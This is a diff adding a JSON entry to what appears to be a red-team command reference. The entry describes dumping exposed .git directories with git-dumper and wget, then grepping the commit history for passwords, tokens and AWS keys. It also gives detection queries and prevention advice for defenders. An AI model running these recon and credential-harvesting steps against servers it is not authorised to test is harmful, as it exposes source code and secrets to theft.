@@ -1,0 +1,101 @@
+{
+  "id": "git-dumper-exposed-git",
+  "name": "Git-Dumper - Dump Exposed .git Directories",
+  "command": "git-dumper http://<target>/.git /tmp/gitdump",
+  "description": "Extracts an exposed .git directory from a web server, reconstructing the full repository locally. Recovers source code, configuration files, and commit history - often revealing hardcoded credentials, API keys, internal URLs, and application logic. Common in dev/staging servers that deploy via git without proper .gitignore or web server rules to block .git access.",
+  "type": "command",
+  "platform": "linux",
+  "requires": [
+    "web-access"
+  ],
+  "tools": [
+    "git-dumper",
+    "git"
+  ],
+  "tags": [
+    "git",
+    "source-code",
+    "credentials",
+    "web",
+    "recon",
+    "cloud",
+    "ssrf"
+  ],
+  "category": "Reconnaissance",
+  "subcategory": "Web Applications",
+  "certifications": [
+    "MCRTA"
+  ],
+  "primary_cert": "MCRTA",
+  "source": "CWL MCRTA Lab - AWS Cloud Red Teaming",
+  "examples": [
+    {
+      "label": "Step 1 - Install git-dumper",
+      "command": "pip3 install git-dumper"
+    },
+    {
+      "label": "Step 2 - Dump exposed .git from target web server",
+      "command": "mkdir /tmp/gitdump\ngit-dumper http://<target>/.git /tmp/gitdump"
+    },
+    {
+      "label": "Step 3 - Review recovered source code",
+      "command": "cd /tmp/gitdump\nls -la\ngit log --oneline\ngit diff HEAD~1"
+    },
+    {
+      "label": "Step 4 - Search for secrets in commit history",
+      "command": "cd /tmp/gitdump\ngit log -p | grep -iE '(password|secret|key|token|api_key|aws_)'"
+    }
+  ],
+  "variations": [
+    {
+      "label": "Check if .git is exposed before dumping",
+      "command": "curl -s -o /dev/null -w '%{http_code}' http://<target>/.git/HEAD",
+      "description": "Returns 200 if .git/HEAD is accessible - confirms the .git directory is exposed before running a full dump."
+    },
+    {
+      "label": "Manual .git recovery without git-dumper",
+      "command": "wget --mirror -I .git http://<target>/.git/\ncd <target>\ngit checkout .",
+      "description": "Alternative manual approach using wget to mirror the .git directory and reconstruct the working tree."
+    }
+  ],
+  "notes": "After recovering source code, look for: (1) hardcoded credentials and API keys, (2) internal URLs and IP addresses, (3) SSRF/RCE vulnerabilities in the code logic, (4) database connection strings, (5) .env files or config files with secrets. Check all branches and the full commit history - secrets are often removed from HEAD but still visible in older commits.",
+  "references": [
+    {
+      "title": "git-dumper - GitHub",
+      "url": "https://github.com/arthaud/git-dumper"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ssrf-exploit",
+      "rel": "next",
+      "note": "Source code may reveal SSRF-vulnerable endpoints to exploit for cloud metadata theft."
+    },
+    {
+      "id": "aws-s3-git-secrets",
+      "rel": "next",
+      "note": "Recovered .git may contain AWS credentials or S3 bucket references."
+    }
+  ],
+  "opsec": "loud",
+  "mitre": [
+    "T1213",
+    "T1552.001"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "Web servers that deploy directly from git repositories often leave the .git directory accessible. The .git directory contains the full repository history including all commits, branches, and file contents - even files that were deleted or had secrets removed in later commits.",
+    "prerequisites": "Target web server with exposed .git directory. git-dumper or wget installed.",
+    "impact": "T1213 Data from Information Repositories + T1552.001 Unsecured Credentials: Credentials in Files. Full source code recovery enables further exploitation through discovered vulnerabilities and leaked credentials.",
+    "detection": "Web server access logs showing sequential requests to .git/ paths (objects, refs, HEAD, config). High volume of 200 responses to .git/* URIs from a single source IP.",
+    "artifacts": "Web server access logs: GET /.git/HEAD, GET /.git/objects/*, GET /.git/refs/* | IDS/WAF: pattern matching on .git path access",
+    "splunk_spl": "index=web sourcetype=\"access_combined\" uri_path=\"*/.git/*\" status=200\n| stats count dc(uri_path) as unique_paths by src_ip, host\n| where count > 20 AND unique_paths > 5",
+    "elastic_kql": "url.path:\"*/.git/*\" AND http.response.status_code:200",
+    "sentinel_kql": "W3CIISLog\n| where csUriStem contains \"/.git/\"\n| where scStatus == 200\n| summarize count(), dcount(csUriStem) by cIP, bin(TimeGenerated, 5m)\n| where count_ > 20",
+    "prevention": "Block access to .git directories in web server config (nginx: location ~ /\\.git { deny all; }). Use .gitignore properly. Deploy built artifacts instead of git repositories. Use WAF rules to block .git path access.",
+    "sources": [
+      "https://attack.mitre.org/techniques/T1213/",
+      "https://attack.mitre.org/techniques/T1552/001/"
+    ]
+  }
+}
